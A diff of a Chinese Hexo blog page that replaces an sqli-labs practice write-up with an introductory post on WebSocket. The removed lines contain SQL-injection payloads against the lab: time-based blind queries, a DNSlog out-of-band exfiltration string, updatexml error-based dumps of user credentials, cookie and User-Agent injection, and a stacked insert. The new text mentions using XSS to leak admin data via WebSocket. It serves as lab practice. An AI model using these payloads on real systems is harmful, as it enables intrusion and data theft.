@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>sqli-labs |  小张之栈</title>
+      <title>websocket |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-sqli-labs"
+  id="post-websocket"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  sqli-labs
+  websocket
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/20/sqli-labs/" class="article-date">
-  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
+      <a href="/2024/03/20/websocket/" class="article-date">
+  <time datetime="2024-03-20T13:25:25.000Z" itemprop="datePublished">2024-03-20</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    <a class="article-category-link" href="/categories/websocket/">websocket</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">779</span>
+            <span class="post-count">556</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">3 分钟</span>
+            <span class="post-count">1 分钟</span>
         </span>
     </span>
 </div>
@@ -120,89 +120,47 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
-<h2 id="less-9-（单引号时间盲注）"><a href="#less-9-（单引号时间盲注）" class="headerlink" title="less 9 （单引号时间盲注）"></a>less 9 （单引号时间盲注）</h2><p>id&#x3D;1 id&#x3D;1’没有回显</p>
-<p>尝试id&#x3D;1’ and sleep(5)–+ 5s后显示  (注释符#也是没用的)</p>
-<p>id&#x3D; 1’ and if(length(database())&gt;0,sleep(5),1)–+</p>
-<p>id&#x3D;1’ and if(substr(database(),1,1)&gt;’a’,sleep(5),1)–+</p>
-<p>或者</p>
-<p>if(ascii(substr(database(),1,1))&gt;64,sleep(5),1)–+ 也是可以的</p>
-<p>爆破即可</p>
-<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p><code>id=1‘ and (select load_file(concat(‘\\\\’,(select hex(user())),‘.ho26y3.dnslog.cn/abc’)))--+</code></p>
-<p><img src="/../../../Typora/img111/image-20230706140021367.png"></p>
-<p>对726F6F7440解码即可</p>
-<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
-<p>发现提示</p>
-<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
-<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
-<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
-<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
-<blockquote>
-<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
-</blockquote>
-<p>可以判定是有单引号的闭合</p>
-<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
-<blockquote>
-<p>the right syntax to use near ‘’ at line 1</p>
-</blockquote>
-<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
-<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
-<blockquote>
-<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>and替换成or也是可以的</p>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^id,username,password’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
-</blockquote>
-<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
-<blockquote>
-<p>Column count doesn’t match value count at row 1</p>
-</blockquote>
-<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
-<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
-</blockquote>
-<p>所以要闭合VALUES.</p>
-<p>利用$uagent，故构建格式，1’,1,1)#</p>
-<p>则：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
-</blockquote>
-<p>即：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
-</blockquote>
-<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
-<blockquote>
-<p>  XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>其余语句类似思路1。</p>
-<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
-<p>admin’，有报错信息…LIMIT..</p>
-<p>注释掉后，即admin’#，页面正常。</p>
-<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
-<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
-<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
-<p>嗯，报错注入也是可行的</p>
-<h2 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h2><p>id&#x3D;1’ 报错</p>
-<p>id&#x3D;1’–+回显成功<br><code>?id=0&#39; union select 1,user(),database(); insert into users(username,password) values(&#39;stack&#39;, &#39;stack&#39;)%23</code></p>
- 
+  <h1 id="0x01-原因"><a href="#0x01-原因" class="headerlink" title="0x01 原因"></a>0x01 原因</h1><p>在一次打靶过程中，用到了一个手段</p>
+<p>利用xss去构造一个websocket连接发送给管理员，使得管理员访问时，触发脚本泄露管理员信息</p>
+<h1 id="0x02-引入"><a href="#0x02-引入" class="headerlink" title="0x02 引入"></a>0x02 引入</h1><p>websocket是一种实时通信手段。</p>
+<p>在此之前有传统通信：电子邮件、网页浏览等有延迟的通信</p>
+<p>实时通信：通话、实时数据传输、不需要主动请求&#x2F;刷新即可更新数据</p>
+<p>实时通信的三种方式：</p>
+<table>
+<thead>
+<tr>
+<th align="center">方式</th>
+<th align="center">实现</th>
+<th align="center">弊端</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">轮询</td>
+<td align="center">客户端定期发送请求</td>
+<td align="center">可能有多次无效请求、资源浪费</td>
+</tr>
+<tr>
+<td align="center">长轮询</td>
+<td align="center">(基于http)客户端发出请求，保持连接，直到新数据响应再关闭</td>
+<td align="center">解决了无效请求，但仍需频繁建立&#x2F;关闭连接</td>
+</tr>
+<tr>
+<td align="center">Comet</td>
+<td align="center">(基于http)客户端请求一次就保持长连接，之后的关闭由服务端控制。</td>
+<td align="center">对于服务器推送方式仍然是延长响应和其他推送技巧</td>
+</tr>
+</tbody></table>
+<p>Comet的实现方式除了长轮询，还有流方式：即往页面插入一个隐藏的iframe，利用其src属性在客户端与服务端之间创建一条连接，服务器向iframe传输数据，实时更新页面</p>
+<h1 id="0x03-websocket"><a href="#0x03-websocket" class="headerlink" title="0x03 websocket"></a>0x03 websocket</h1><p>对于Comet的那个弊端可能描述的不清晰。</p>
+<p>先体现一下http的通信特点，它只实现客户端到服务端的单向通信，客户端作为主动请求的一方</p>
+<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>而websocket，实现<strong>双向通信</strong>(服务端可以主动发送请求)、<strong>降低延迟</strong>(连接建立即保持开放)、<strong>高效资源利用</strong>(连接只建立一次)</p>
+<p>所以更适用于web上那种聊天啊、游戏等低延迟应用。</p>
+<p>此外，js、c#、python、java都有相应库</p>
+<p>为了保持长连接，它依赖于一个 <strong>心跳机制</strong>，就是它会定期发送一些心跳包（只用来维持状态，不发送数据）。因此，如果一段时间收不到，就说明连接断了</p>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>不加密</p>
+<p>古老浏览器用ajax或其他方式代替</p>
+<p>保持长连接对服务器优化有要求，否则消耗资源</p>
+<h1 id="0x04-实现"><a href="#0x04-实现" class="headerlink" title="0x04 实现"></a>0x04 实现</h1> 
       <!-- reward -->
       
     </div>
@@ -266,12 +224,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/sqli-labs/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/03/20/websocket/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">绕过</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li></ul>
 
     </footer>
   </div>
@@ -279,19 +237,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            python与渗透
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" class="article-nav-link">
+      <a href="/2024/03/20/dailipy/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">sql注入-tips</div>
+        <div class="article-nav-title">代理相关</div>
       </a>
     
   </nav>
